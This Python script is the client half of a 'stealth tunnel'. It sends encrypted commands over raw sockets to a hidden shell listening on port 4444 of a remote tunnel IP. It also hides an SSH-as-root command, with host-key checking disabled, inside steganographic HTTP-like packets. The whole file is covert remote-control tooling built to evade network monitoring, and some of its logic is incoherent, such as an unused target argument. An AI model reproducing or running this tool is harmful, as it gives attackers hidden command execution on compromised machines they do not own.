#!/usr/bin/env python3
"""
Advanced Client for Enhanced Stealth Tunnel
Encryption and steganography support
"""

import socket
import json
import base64
import argparse
from crypto_tunnel import CryptoManager

class EnhancedStealthClient:
    def __init__(self, target_ip, key_file=None, master_password=None):
        self.target_ip = target_ip
        self.crypto = CryptoManager(master_password, key_file)
        
    def encrypted_ssh_connect(self, tunnel_ip, port=22):
        """Encrypted SSH connection"""
        try:
            
            ssh_command = f"ssh -o StrictHostKeyChecking=no root@127.0.0.1"
            
            encrypted_cmd = self.crypto.encrypt_aes(ssh_command.encode())
            
            steganographic_data = self.crypto.create_steganographic_packet(
                encrypted_cmd, 'http'
            )
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((tunnel_ip, port))
            sock.send(steganographic_data)
            
            response = sock.recv(4096)
            
            extracted = self.crypto.extract_from_http(response)
            if extracted:
                decrypted = self.crypto.decrypt_aes(extracted)
                print(f"SSH Response: {decrypted.decode()}")
                
            sock.close()
            
        except Exception as e:
            print(f"[!] SSH error: {e}")
            
    def covert_shell_command(self, tunnel_ip, command, port=4444):
        """Hidden command Shell"""
        try:
        
            encrypted_cmd = self.crypto.encrypt_chacha20(command.encode())
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((tunnel_ip, port))
            sock.send(encrypted_cmd)
            
            response = sock.recv(4096)
            
            decrypted_response = self.crypto.decrypt_chacha20(response)
            print(f"Command output:\n{decrypted_response.decode()}")
            
            sock.close()
            
        except Exception as e:
            print(f"[!] Shell error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Enhanced Stealth Client')
    parser.add_argument('target', help='IP Target Host')
    parser.add_argument('-k', '--keys', help='Keys file')
    parser.add_argument('-p', '--password', help='Master-key')
    parser.add_argument('--ssh', help='SSH to tunnel IP')
    parser.add_argument('--shell', help='The command for the hidden shell')
    parser.add_argument('--tunnel-ip', help='IP tunnel', default='198.51.100.20')
    
    args = parser.parse_args()
    
    client = EnhancedStealthClient(args.target, args.keys, args.password)
    
    if args.ssh:
        client.encrypted_ssh_connect(args.ssh)
    elif args.shell:
        client.covert_shell_command(args.tunnel_ip, args.shell)
